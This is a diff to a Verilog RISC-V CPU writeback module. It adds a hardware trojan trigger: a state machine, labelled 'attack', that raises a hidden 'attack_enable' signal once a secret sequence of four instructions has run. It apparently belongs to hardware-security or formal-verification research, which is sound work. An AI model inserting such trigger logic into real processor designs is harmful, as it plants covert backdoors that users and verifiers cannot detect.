@@ -5,6 +5,7 @@ module rv32_writeback (
     input clk,
     input reset,
     output reg [3:0] attack_monitor,
+    output reg attack_enable,
 `ifdef RISCV_FORMAL
     /* debug control in */
     input intr_in,
@@ -61,6 +62,14 @@ module rv32_writeback (
 );
 
 /** attack **/
+
+    localparam 
+        waitingInstr0 = 2'b11,
+        waitingInstr1 = 2'b10,
+        waitingInstr2 = 2'b01,
+        waitingInstr3 = 2'b00;
+    reg [1:0] attack_state;
+
     localparam
         step0 = 32'h0ff7_f713,  //h0ff7_f713   h13f7_f70f
         step1 = 32'h0087_f793,  //h0087_f793   h93f7_8700
@@ -69,16 +78,53 @@ module rv32_writeback (
 
     always_ff @(posedge clk) begin
         if (reset) begin
-            attack_monitor<= 0;
+            attack_monitor <= 0;
+            attack_enable  <= 0;
+            attack_state   <= waitingInstr0;
         end else if ( !flush_in && valid_in ) begin 
-            if ( instr_in == step0 ) 
-              attack_monitor[0] <= 1'b1;
-            if ( instr_in == step1 ) 
-              attack_monitor[1] <= 1'b1;
-            if ( instr_in == step2 ) 
-               attack_monitor[2] <= 1'b1;
-            if ( instr_in == step3 )
-               attack_monitor[3] <= 1'b1;
+            case (attack_state)
+                waitingInstr0: begin
+                    attack_enable <= 0;
+                    if (instr_in == step0) begin
+                         attack_state <= waitingInstr1;
+                         attack_monitor[0] <= 1'b1;
+                    end else 
+                         attack_state <= waitingInstr0;
+                end
+                waitingInstr1: begin
+                    attack_enable <= 0;
+                    if (instr_in == step1) begin
+                         attack_state <= waitingInstr2;
+                         attack_monitor[1] <= 1'b1;
+                    end else
+                         attack_state <= waitingInstr0;
+
+                end
+                waitingInstr2: begin
+                    attack_enable <= 0;
+                    if (instr_in == step2) begin
+                         attack_state <= waitingInstr3;
+                         attack_monitor[2] <= 1'b1;
+                    end else
+                         attack_state <= waitingInstr0;
+                end
+                waitingInstr3: begin
+                    if (instr_in == step3) begin
+                         attack_state  <= waitingInstr0;
+                         attack_enable <= 1;
+                         attack_monitor[3] <= 1'b1;
+                    end else begin
+                         attack_state  <= waitingInstr0;
+                         attack_enable <= 0;
+                    end
+                end
+                default: begin
+                    attack_monitor <= 0;
+                    attack_enable  <= 0;
+                    attack_state   <= waitingInstr0;
+                end
+
+            endcase
         end
     end
 /** attack **/
